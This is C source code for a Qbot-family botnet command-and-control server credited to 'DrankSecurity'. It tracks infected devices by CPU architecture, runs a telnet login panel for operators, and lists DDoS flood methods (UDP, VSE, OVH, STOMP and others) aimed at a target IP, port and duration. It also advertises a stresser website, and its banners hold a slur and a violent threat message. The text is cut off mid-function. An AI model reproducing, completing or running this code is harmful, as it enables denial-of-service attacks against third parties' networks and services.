/*
fearless.txt for logins
*/
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netdb.h>
#include <unistd.h>
#include <time.h>
#include <fcntl.h>
#include <sys/epoll.h>
#include <errno.h>
#include <pthread.h>
#include <signal.h>
#include <ctype.h>

#define MAXFDS 1000000
#define RED     "\x1b[0;36m"
#define Cyan   "\x1b[1;36m"
#define C_RESET   "\x1b[0m"

char *apiip = "";

struct account {
    char id[20]; 
    char password[20];
};
static struct account accounts[25];

struct clientdata_t {
        uint32_t ip;
        char x86;
	char ARM;
	char mips;
	char mpsl;
	char ppc;
	char spc;
	char unknown;
        char build[7];
        char connected;
} clients[MAXFDS];

struct telnetdata_t {
        uint32_t ip; 
        int connected;
} managements[MAXFDS];

////////////////////////////////////

static volatile FILE *fileFD;
static volatile int epollFD = 0;
static volatile int listenFD = 0;
static volatile int managesConnected = 0;
static volatile int DUPESDELETED = 0;

////////////////////////////////////


int fdgets(unsigned char *buffer, int bufferSize, int fd)
{
        int total = 0, got = 1;
        while(got == 1 && total < bufferSize && *(buffer + total - 1) != '\n') { got = read(fd, buffer + total, 1); total++; }
        return got;
}
void trim(char *str)
{
    int i;
    int begin = 0;
    int end = strlen(str) - 1;
    while (isspace(str[begin])) begin++;
    while ((end >= begin) && isspace(str[end])) end--;
    for (i = begin; i <= end; i++) str[i - begin] = str[i];
    str[i - begin] = '\0';
}


static int make_socket_non_blocking (int sfd)
{
        int flags, s;
        flags = fcntl (sfd, F_GETFL, 0);
        if (flags == -1)
        {
                perror ("fcntl");
                return -1;
        }
        flags |= O_NONBLOCK;
        s = fcntl (sfd, F_SETFL, flags); 
        if (s == -1)
        {
                perror ("fcntl");
                return -1;
        }
        return 0;
}


static int create_and_bind (char *port)
{
        struct addrinfo hints;
        struct addrinfo *result, *rp;
        int s, sfd;
        memset (&hints, 0, sizeof (struct addrinfo));
        hints.ai_family = AF_UNSPEC;
        hints.ai_socktype = SOCK_STREAM;
        hints.ai_flags = AI_PASSIVE;
        s = getaddrinfo (NULL, port, &hints, &result);
        if (s != 0)
        {
                fprintf (stderr, "getaddrinfo: %s\n", gai_strerror (s));
                return -1;
        }
        for (rp = result; rp != NULL; rp = rp->ai_next)
        {
                sfd = socket (rp->ai_family, rp->ai_socktype, rp->ai_protocol);
                if (sfd == -1) continue;
                int yes = 1;
                if ( setsockopt(sfd, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int)) == -1 ) perror("setsockopt");
                s = bind (sfd, rp->ai_addr, rp->ai_addrlen);
                if (s == 0)
                {
                        break;
                }
                close (sfd);
        }
        if (rp == NULL)
        {
                fprintf (stderr, "Could not bind\n");
                return -1;
        }
        freeaddrinfo (result);
        return sfd;
}


void broadcast(char *msg, int us, char *sender)
{
        int sendMGM = 1;
        if(strcmp(msg, "PING") == 0) sendMGM = 0;
        char *wot = malloc(strlen(msg) + 10);
        memset(wot, 0, strlen(msg) + 10);
        strcpy(wot, msg);
        trim(wot);
        time_t rawtime;
        struct tm * timeinfo;
        time(&rawtime);
        timeinfo = localtime(&rawtime);
        char *timestamp = asctime(timeinfo);
        trim(timestamp);
        int i;
        for(i = 0; i < MAXFDS; i++)
        {
                if(i == us || (!clients[i].connected &&  (sendMGM == 0 || !managements[i].connected))) continue;
                if(sendMGM && managements[i].connected)
                {                     
                        send(i, "\x1b[36mID:", 8, MSG_NOSIGNAL);
                        send(i, sender, strlen(sender), MSG_NOSIGNAL);
                        send(i, " ", 1, MSG_NOSIGNAL);
                        send(i, timestamp, strlen(timestamp), MSG_NOSIGNAL);
                        send(i, ": ", 2, MSG_NOSIGNAL); 
                }
                send(i, msg, strlen(msg), MSG_NOSIGNAL);
                if(sendMGM && managements[i].connected) send(i, "\r\n\x1b[0m~\x1b[1;36m> \x1b[0m", 13, MSG_NOSIGNAL);
                else send(i, "\n", 1, MSG_NOSIGNAL);
        }
        free(wot);
}
 
void *epollEventLoop(void *useless)
{
	struct epoll_event event;
	struct epoll_event *events;
	int s;
	events = calloc(MAXFDS, sizeof event);
	while (1)
	{
		int n, i;
		n = epoll_wait(epollFD, events, MAXFDS, -1);
		for (i = 0; i < n; i++)
		{
			if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
			{
				clients[events[i].data.fd].connected = 0;
                clients[events[i].data.fd].x86 = 0;
                clients[events[i].data.fd].ARM = 0;
                clients[events[i].data.fd].mips = 0;
                clients[events[i].data.fd].mpsl = 0;
                clients[events[i].data.fd].ppc = 0;
                clients[events[i].data.fd].spc = 0;
                clients[events[i].data.fd].unknown = 0;
				close(events[i].data.fd);
				continue;
			}
			else if (listenFD == events[i].data.fd)
			{
				while (1)
				{
					struct sockaddr in_addr;
					socklen_t in_len;
					int infd, ipIndex;

					in_len = sizeof in_addr;
					infd = accept(listenFD, &in_addr, &in_len);
					if (infd == -1)
					{
						if ((errno == EAGAIN) || (errno == EWOULDBLOCK)) break;
						else
						{
							perror("accept");
							break;
						}
					}

					clients[infd].ip = ((struct sockaddr_in *)&in_addr)->sin_addr.s_addr;

					int dup = 0;
					for (ipIndex = 0; ipIndex < MAXFDS; ipIndex++)
					{
						if (!clients[ipIndex].connected || ipIndex == infd) continue;

						if (clients[ipIndex].ip == clients[infd].ip)
						{
							dup = 1;
							break;
						}
					}

					if (dup)
					{
						DUPESDELETED++;
						continue;
					}

					s = make_socket_non_blocking(infd);
					if (s == -1) { close(infd); break; }

					event.data.fd = infd;
					event.events = EPOLLIN | EPOLLET;
					s = epoll_ctl(epollFD, EPOLL_CTL_ADD, infd, &event);
					if (s == -1)
					{
						perror("epoll_ctl");
						close(infd);
						break;
					}

					clients[infd].connected = 1;

				}
				continue;
			}
			else
			{
				int thefd = events[i].data.fd;
				struct clientdata_t *client = &(clients[thefd]);
				int done = 0;
				client->connected = 1;
		        client->x86 = 0;
		        client->ARM = 0;
		        client->mips = 0;
		        client->mpsl = 0;
		        client->ppc = 0;
		        client->spc = 0;
		        client->unknown = 0;
				while (1)
				{
					ssize_t count;
					char buf[2048];
					memset(buf, 0, sizeof buf);

					while (memset(buf, 0, sizeof buf) && (count = fdgets(buf, sizeof buf, thefd)) > 0)
					{
						if (strstr(buf, "\n") == NULL) { done = 1; break; }
						trim(buf);
						if (strcmp(buf, "PING") == 0) {
							if (send(thefd, "PONG\n", 5, MSG_NOSIGNAL) == -1) { done = 1; break; }
							continue;
						}

										        if(strstr(buf, "x86_64") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "x86_32") == buf)
												{
													client->x86 = 1;
												}
												if(strstr(buf, "ARM4") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM5") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "ARM6") == buf)
												{
													client->ARM = 1; 
												}
												if(strstr(buf, "MIPS") == buf)
												{
													client->mips = 1; 
												}
												if(strstr(buf, "MPSL") == buf)
												{
													client->mpsl = 1; 
												}
												if(strstr(buf, "PPC") == buf)
												{
													client->ppc = 1;
												}
												if(strstr(buf, "SPC") == buf)
												{
													client->spc = 1;
												}					
												if(strstr(buf, "idk") == buf)
												{
													client->unknown = 1;
												}					
																							
						if (strcmp(buf, "PONG") == 0) {
							continue;
						}
						printf(" \"%s\"\n", buf);
					}

					if (count == -1)
					{
						if (errno != EAGAIN)
						{
							done = 1;
						}
						break;
					}
					else if (count == 0)
					{
						done = 1;
						break;
					}
				}

				if (done)
				{
					client->connected = 0;
		            client->x86 = 0;
		            client->ARM = 0;
		            client->mips = 0;
		            client->mpsl = 0;
		            client->ppc = 0;
		            client->spc = 0;
		            client->unknown = 0;
				  	close(thefd);
				}
			}
		}
	}
}


unsigned int x86Connected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].x86) continue;
                total++;
        }
 
        return total;
}
unsigned int armConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ARM) continue;
                total++;
        }
 
        return total;
}
unsigned int mipsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mips) continue;
                total++;
        }
 
        return total;
}
unsigned int mpslConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].mpsl) continue;
                total++;
        }
 
        return total;
}
unsigned int ppcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].ppc) continue;
                total++;
        }
 
        return total;
}
unsigned int spcConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].spc) continue;
                total++;
        }
 
        return total;
}
unsigned int unknownConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].unknown) continue;
                total++;
        }
 
        return total;
}
 
unsigned int clientsConnected()
{
        int i = 0, total = 0;
        for(i = 0; i < MAXFDS; i++)
        {
                if(!clients[i].connected) continue;
                total++;
        }
 
        return total;
}
 
void *titleWriter(void *sock) 
{
        int thefd = (int)sock;
        char string[2048];
        while(1)
        {
                memset(string, 0, 2048);
                sprintf(string, "%c]0; [+] Skids Online: %d [-] Verified Users Online: %d [+] Expire: [31days] %c", '\033', clientsConnected(), managesConnected, '\007');
                if(send(thefd, string, strlen(string), MSG_NOSIGNAL) == -1);
 
                sleep(2);
        }
}

int Search_in_File(char *str)
{
    FILE *fp;
    int line_num = 0;
    int find_result = 0, find_line=0;
    char temp[512];

    if((fp = fopen("fearless.txt", "r")) == NULL){
        return(-1);
    }
    while(fgets(temp, 512, fp) != NULL){
        if((strstr(temp, str)) != NULL){
            find_result++;
            find_line = line_num;
        }
        line_num++;
    }
    if(fp)
        fclose(fp);

    if(find_result == 0)return 0;

    return find_line;
}
 void client_addr(struct sockaddr_in addr){
        printf("IP:%d.%d.%d.%d\n",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        FILE *logFile;
        logFile = fopen("monitor.log", "a");
        fprintf(logFile, "\nIP:%d.%d.%d.%d ",
        addr.sin_addr.s_addr & 0xFF,
        (addr.sin_addr.s_addr & 0xFF00)>>8,
        (addr.sin_addr.s_addr & 0xFF0000)>>16,
        (addr.sin_addr.s_addr & 0xFF000000)>>24);
        fclose(logFile);
}

void *telnetWorker(void *sock) { 
        int thefd = (int)sock;
        managesConnected++;
        int find_line;
        pthread_t title;
        char counter[2048];
        memset(counter, 0, 2048);
        char buf[2048];
        char* nickstring;
        char usernamez[80];
        char* password;
        char* admin;
        memset(buf, 0, sizeof buf);
        char botnet[2048];
        memset(botnet, 0, 2048);

        FILE *fp;
        int i=0;
        int c;
        fp=fopen("fearless.txt", "r");
        while(!feof(fp)) 
        {
                c=fgetc(fp);
                ++i;
        }
        int j=0;
        rewind(fp);
        while(j!=i-1) 
        { 
            fscanf(fp, "%s %s", accounts[j].id, accounts[j].password);
            ++j;
        }
        sprintf(botnet, "\x1b[36m♆ WelCome To DrankSecurity ♆\r\n");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;  
        sprintf(botnet, "\x1b[94mUserName\x1b[92m:\x1b[92m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        sprintf(usernamez, buf);
        nickstring = ("%s", buf);
        find_line = Search_in_File(nickstring);

        if(strcmp(nickstring, accounts[find_line].id) == 0){                  
        sprintf(botnet, "\x1b[94mPassWord\x1b[92m:\x1b[30m ");
        if(send(thefd, botnet, strlen(botnet), MSG_NOSIGNAL) == -1) goto end;
        if(fdgets(buf, sizeof buf, thefd) < 1) goto end;
        trim(buf);
        if(strcmp(buf, accounts[find_line].password) != 0) goto failed;
        memset(buf, 0, 2048);
        goto fak;
        }
        failed:
        if(send(thefd, "\033[1A", 5, MSG_NOSIGNAL) == -1) goto end;
        char failed_line1[100];
        char failed_line2[100];
        char failed_line3[100];
        char failed_line4[100];
        char failed_line5[100];
        char failed_line6[100];
        char failed_line7[100];
        char failed_line8[100];
        char failed_line9[100];
        char failed_line10[100];
        char failed_line11[100];
        char failed_line12[100];

        sprintf(failed_line1, "\x1b[1;36m              _________                   _______  \r\n");
        sprintf(failed_line2, "\x1b[1;36m    _-----____/   ========================|______| \r\n");
        sprintf(failed_line3, "\x1b[1;36m    |           ______________/                    \r\n");
        sprintf(failed_line4, "\x1b[1;36m    |    ___--_/(_)       ^                        \r\n");
        sprintf(failed_line5, "\x1b[1;36m    |___ ---                                       \r\n");
        sprintf(failed_line6, "\x1b[1;92mI'M GONNA GIVE YOU TO THE COUNT OF TEN TO GET YOUR, UGLY\r\n");
        sprintf(failed_line7, "\x1b[1;36mYELLA, NO GOOD KEESTER OFF MY PROPERTY, BEFORE I PUMP\r\n");
        sprintf(failed_line8, "\x1b[1;93mYOUR GUTS FULL'A LEAD...\r\n");
        sprintf(failed_line9, "\x1b[1;92mONE ...\r\n");
        sprintf(failed_line10,"\x1b[1;93mTWO ...\r\n");
        sprintf(failed_line11,"\x1b[1;36mTEN ...\r\n");
        sprintf(failed_line12,"\x1b[1;96mKEEP THE CHANGE YAH FILTHY ANIMAL.\r\n");
        if(send(thefd, failed_line1, strlen(failed_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line2, strlen(failed_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line3, strlen(failed_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line4, strlen(failed_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line5, strlen(failed_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line6, strlen(failed_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line7, strlen(failed_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, failed_line8, strlen(failed_line8), MSG_NOSIGNAL) == -1) goto end;
        sleep(3);
        if(send(thefd, failed_line9, strlen(failed_line9), MSG_NOSIGNAL) == -1) goto end;
        sleep(2);
        if(send(thefd, failed_line10, strlen(failed_line10), MSG_NOSIGNAL) == -1) goto end;
        sleep(2);
        if(send(thefd, failed_line11, strlen(failed_line11), MSG_NOSIGNAL) == -1) goto end;
        sleep(2);
        if(send(thefd, failed_line12, strlen(failed_line12), MSG_NOSIGNAL) == -1) goto end;
        sleep(2);
        goto end;
        fak:
        
        pthread_create(&title, NULL, &titleWriter, sock);
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, "\r\n", 2, MSG_NOSIGNAL) == -1) goto end;
        char ascii_banner_line00 [5000];
        char ascii_banner_line000 [5000];
        char ascii_banner_line0 [5000];
        char ascii_banner_line1 [5000];
        char ascii_banner_line2 [5000];
        char ascii_banner_line3 [5000];
        char ascii_banner_line4 [5000];
        char ascii_banner_line5 [5000];
        char ascii_banner_line6 [5000];
        char ascii_banner_line7 [5000];
        char ascii_banner_line8 [5000];
        char ascii_banner_line9 [5000];
        char ascii_banner_line10 [5000];
        char ascii_banner_line11 [5000];
        char ascii_banner_line12 [5000];
        char ascii_banner_line13 [5000];
        char ascii_banner_line14 [5000];

           sprintf(ascii_banner_line00,  "\e[0;36m      message ZeroTwo#3495 for help or @l6eo\e[37m\r\n");
           sprintf(ascii_banner_line000,  "\e[0;36m                                                                      \e[37m\r\n");
           sprintf(ascii_banner_line0,  "\e[0;36m                        ╔╦╗╦═╗╔═╗╔╗╔╦╔═\x1b[\e[0;36m ╔═╗╔═╗╔═╗╦ ╦╦═╗╦╔╦╗╦ ╦\e[37m\r\n");
           sprintf(ascii_banner_line1,  "\e[0;36m                         ║║╠╦╝╠═╣║║║╠╩╗\x1b[0;36m ╚═╗║╣ ║  ║ ║╠╦╝║ ║ ╚╦╝\e[37m\r\n");
           sprintf(ascii_banner_line2,  "\e[0;36m                        ═╩╝╩╚═╩ ╩╝╚╝╩ ╩\x1b[0;36m ╚═╝╚═╝╚═╝╚═╝╩╚═╩ ╩  ╩ \e[37m\r\n");
           sprintf(ascii_banner_line3,  "\e[0;36m                                 👾フランクスのダリン👾\e[37m\r\n");
	   sprintf(ascii_banner_line4,  "\e[0;36m                 ╔═════════════════════\x1b[0;36m══════════════════════════╗\e[37m\r\n");
	   sprintf(ascii_banner_line5,  "\e[0;36m                 ║     \033[33mWelcome To The start Screen Of ZeroTwo\e[0;36m    ║\e[37m\r\n");
	   sprintf(ascii_banner_line6,  "\e[0;36m                 ║   \033[33mPowered By DrankSecurityAPI,RanBy @ovh.de\e[0;36m   ║\e[37m\r\n");
	   sprintf(ascii_banner_line7,  "\e[0;36m                 ╚═════════════════════\x1b[0;36m══════════════════════════╝\e[37m\r\n");
	   sprintf(ascii_banner_line8, "\e[0;36m                     ╔══════════════════\x1b[0;36m══════════════════════╗\e[37m\r\n");
	   sprintf(ascii_banner_line9, "\e[0;36m                     ║       \033[33mhttps://demmonstresser.net/\e[0;36m      ║\e[37m\r\n");
	   sprintf(ascii_banner_line10, "\e[0;36m                     ╚═════════════════\x1b[0;36m═══════════════════════╝\e[37m\r\n");
        
        if (send(thefd, "\033[1A\033[2J\033[1;1H", 14, MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line00, strlen(ascii_banner_line00), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line000, strlen(ascii_banner_line000), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line0, strlen(ascii_banner_line0), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line1, strlen(ascii_banner_line1), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line2, strlen(ascii_banner_line2), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line3, strlen(ascii_banner_line3), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line4, strlen(ascii_banner_line4), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line5, strlen(ascii_banner_line5), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line6, strlen(ascii_banner_line6), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line7, strlen(ascii_banner_line7), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line8, strlen(ascii_banner_line8), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line9, strlen(ascii_banner_line9), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line10, strlen(ascii_banner_line10), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line11, strlen(ascii_banner_line11), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line12, strlen(ascii_banner_line12), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line13, strlen(ascii_banner_line13), MSG_NOSIGNAL) == -1) goto end;
        if(send(thefd, ascii_banner_line14, strlen(ascii_banner_line14), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, "\x1b[36mDrank$  \x1b[96m", 12, MSG_NOSIGNAL) == -1) goto end;
        pthread_create(&title, NULL, &titleWriter, sock);
        managements[thefd].connected = 1;
        while(fdgets(buf, sizeof buf, thefd) > 0)
        { 
        if(strstr(buf, "bots") || strstr(buf, "BOTS") || strstr(buf, "botcount") || strstr(buf, "BOTCOUNT") || strstr(buf, "count") || strstr(buf, "COUNT")) {
            char synpur1[128];
            char synpur2[128];
            char synpur3[128];
            char synpur4[128];
            char synpur5[128];
            char synpur6[128];
            char synpur7[128];
            char synpur8[128];

            if(x86Connected() != 0) 
            {
                sprintf(synpur1,"\e[0;36mx86:  \e[1;36m[%d]\r\n",     x86Connected());
                if(send(thefd, synpur1, strlen(synpur1), MSG_NOSIGNAL) == -1) goto end;
            }
            if(armConnected() != 0)
            {
                sprintf(synpur2,"\e[0;36mArm7:  \e[1;36m[%d] \e[0;36m\r\n",     armConnected());
                if(send(thefd, synpur2, strlen(synpur2), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mipsConnected() != 0)
            {
                sprintf(synpur3,"\e[0;36mMips:  \e[1;36m[%d] \e[0;36m\r\n",     mipsConnected());
                if(send(thefd, synpur3, strlen(synpur3), MSG_NOSIGNAL) == -1) goto end;
            }
            if(mpslConnected() != 0)
            {
                sprintf(synpur4,"\e[0;36mMpsl:  \e[1;36m[%d] \e[0;36m\r\n",     mpslConnected());
                if(send(thefd, synpur4, strlen(synpur4), MSG_NOSIGNAL) == -1) goto end;
            }
            if(ppcConnected() != 0)
            {
                sprintf(synpur5,"\e[0;36mPpc:  \e[1;36m[%d] \e[0;36m\r\n",     ppcConnected());
                if(send(thefd, synpur5, strlen(synpur5), MSG_NOSIGNAL) == -1) goto end;
            }
            if(spcConnected() != 0)
            {
                sprintf(synpur6,"\e[0;36mSpc:  \e[1;36m[%d] \e[0;36m\r\n",     spcConnected());
                if(send(thefd, synpur6, strlen(synpur6), MSG_NOSIGNAL) == -1) goto end;
            }
            if(unknownConnected() != 0)
            {
                sprintf(synpur7,"\e[0;36mUnknow: \e[1;36m[%d] \e[0;36m\r\n",  unknownConnected());
                if(send(thefd, synpur7, strlen(synpur7), MSG_NOSIGNAL) == -1) goto end;
            }
               sprintf(synpur8, "\e[0;36mTotal: \e[1;36m [%d] \e[0;36m\r\n",  clientsConnected());
               if(send(thefd, synpur8, strlen(synpur8), MSG_NOSIGNAL) == -1) goto end;
            
                while(1) {
                if(send(thefd, "\x1b[0;36m--->  \x1b[0;36m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
        }
        
if(strstr(buf, "METHODS") || strstr(buf, "methods") || strstr(buf, "METHOD") || strstr(buf, "method")) 
        {
               char method1  [5000];
                char method2  [5000];
                char method3  [5000];
                char method4  [5000];
                char method5  [5000];
                char method6  [5000];
                char method7  [5000];
                char method8  [5000];
                char method9  [5000];
                char method10 [5000];
                char method11 [5000];
                char method12 [5000];
                char method13 [5000];
                char method14 [5000];
                char method15 [5000];
                char method16 [5000];
                char method17 [5000];
                char method18 [5000];
                char method19 [5000];
                char method20 [5000];
                char method21 [5000];
                char method22 [5000];
                char method23 [5000];
                char method24 [5000];
                char method25 [5000];



         sprintf(method1,  "\e[0;36m  ╔═════════════════════════════════════╦════════════════════════════════════╗\e[37m\r\n");
         sprintf(method2,  "\e[0;36m  ║\e[33m* UDP METHOD IP PORT TIME 32 1350 10\e[0;33m ║\e[33m* VSE METHOD IP PORT TIME 32 1460 10\e[0;36m║\e[37m\r\n");
         sprintf(method3,  "\e[0;36m  ╚╦═══════════════════════════════════╦╩╦══════════════════════════════════╦╝\e[37m\r\n");
         sprintf(method4, "\e[0;36m ╔═╩═══════════════════════════════════╝ ╚══════════════════════════════════╩═╗\e[37m\r\n");
         sprintf(method5, "\e[0;36m ╚╗ \e[33m* RAW   METHOD IP PORT TIME\e[0;36m        ╔═╗ \e[33m* NFO METHOD IP PORT TIME 1460\e[0;36m    ╔╝\e[37m\r\n");
         sprintf(method6,  "\e[0;36m  ║ \e[33m* RHEX  METHOD IP PORT TIME\e[0;36m        ║ ║ \e[33m* OVH METHOD IP PORT TIME 1024\e[0;36m    ║\e[37m\r\n");
         sprintf(method7,  "\e[0;36m  ║ \e[33m* GAME  METHOD IP PORT TIME\e[0;36m        ║ ║ \e[33m* RIP METHOD IP PORT TIME 1024\e[0;36m    ║\e[37m\r\n");
         sprintf(method8,  "\e[0;36m  ║ \e[33m* KISS  METHOD IP PORT TIME\e[0;36m        ║ ║ \e[33m* STOMP METHOD IP PORT TIME 1024\e[0;36m  ║\e[37m\r\n");
         sprintf(method9,  "\e[0;36m  ║ \e[33m* CLAP  METHOD IP PORT TIME\e[0;36m        ║ ║ \e[33m* JUNK  METHOD IP PORT TIME\e[0;36m       ║\e[37m\r\n");
         sprintf(method10, "\e[0;36m  ╚═══════════╦════════════════════════╝ ╚═══════════════════════╦═══════════╝\e[37m\r\n");
         sprintf(method11, "\e[0;36m              ║\e[33m* HOW TO USE IT !!\e[0;36m      ╔═╗\e[33m!* METHOD IP PORT TIME\e[0;36m ║\e[37m\r\n"); 
         sprintf(method12, "\e[0;36m              ╚════════════════════════╝ ╚═══════════════════════╝\e[37m\r\n");


                if(send(thefd, method1,  strlen(method1),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method2,  strlen(method2),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method3,  strlen(method3),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method4,  strlen(method4),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method5,  strlen(method5),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method6,  strlen(method6),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method7,  strlen(method7),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method8,  strlen(method8),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method9,  strlen(method9),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method10,  strlen(method10),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method11,  strlen(method11),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method12,  strlen(method12),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method13,  strlen(method13),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method14,  strlen(method14),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method15,  strlen(method15),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method16,  strlen(method16),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method17,  strlen(method17),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method18,  strlen(method18),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method19,  strlen(method19),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method20,  strlen(method20),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method21,  strlen(method21),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method22,  strlen(method22),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method23,  strlen(method23),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method24,  strlen(method24),  MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, method25,  strlen(method25),  MSG_NOSIGNAL) == -1) goto end;
                pthread_create(&title, NULL, &titleWriter, sock);
                while(1) {
                if(send(thefd, "\x1b[36m▬► \x1b[96m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
                }

                if(strstr(buf, "chat")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char epline1  [5000];
                char epline2  [5000];
                char epline3  [5000];
                char epline4  [5000];
                char epline5  [5000];
                char epline6  [5000];

                sprintf(epline1,  "\x1b[36m  Welcome to the chat  \r\n");
                sprintf(epline6,  "\x1b[36m     \r\n");
                
                if(send(thefd, epline1,  strlen(epline1), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, epline2,  strlen(epline2), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, epline3,  strlen(epline3), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, epline4,  strlen(epline4), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, epline5,  strlen(epline5), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, epline6,  strlen(epline6), MSG_NOSIGNAL) == -1) goto end;
                while(1) {
                if(send(thefd, "\x1b[36mtype:  \x1b[96m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
            }

                if(strstr(buf, "CREDIT")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char creditline1  [5000];
                char creditline2  [5000];
                char creditline3  [5000];
                char creditline4  [5000];
                char creditline5  [5000];

                sprintf(creditline1,  "\x1b[36m  ════════════════════════════════════  \r\n");
                sprintf(creditline2,  "\x1b[36m ║ \x1b[96m  DrankSecurity Private Qbot\x1b[36m        ║ \r\n");
                sprintf(creditline3,  "\x1b[36m ║ \x1b[96m        Created By\x1b[36m                 ║ \r\n");
                sprintf(creditline4,  "\x1b[36m ║ \x1b[96mZeroTwo#3495 & DrankSecurity\x1b[36m       ║ \r\n");
                sprintf(creditline5,  "\x1b[36m  ════════════════════════════════════   \r\n");
                
                if(send(thefd, creditline1,  strlen(creditline1), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, creditline2,  strlen(creditline2), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, creditline3,  strlen(creditline3), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, creditline4,  strlen(creditline4), MSG_NOSIGNAL) == -1) goto end;
                if(send(thefd, creditline5,  strlen(creditline5), MSG_NOSIGNAL) == -1) goto end;
                while(1) {
                if(send(thefd, "\x1b[36mDrank$  \x1b[96m", 12, MSG_NOSIGNAL) == -1) goto end;
                break;
                }
                continue;
        }

                    if(strstr(buf, "TOS")) {
                pthread_create(&title, NULL, &titleWriter, sock);
                char repline1  [5000];
                char repline2  [5000];
                char repline3  [5000];
                char repline4  [5000];
                char repline5  [5000];
                char repline6  [5000];

                sprintf(repline1,  "\x1b[36m  ═════════════════════════════════════════  \r\n");
                sprintf(repline2,  "\x1b[36m ║ \x1b[96mDONT SHARE YOUR INFO FAGG\x1b[36m               ║ \r\n");
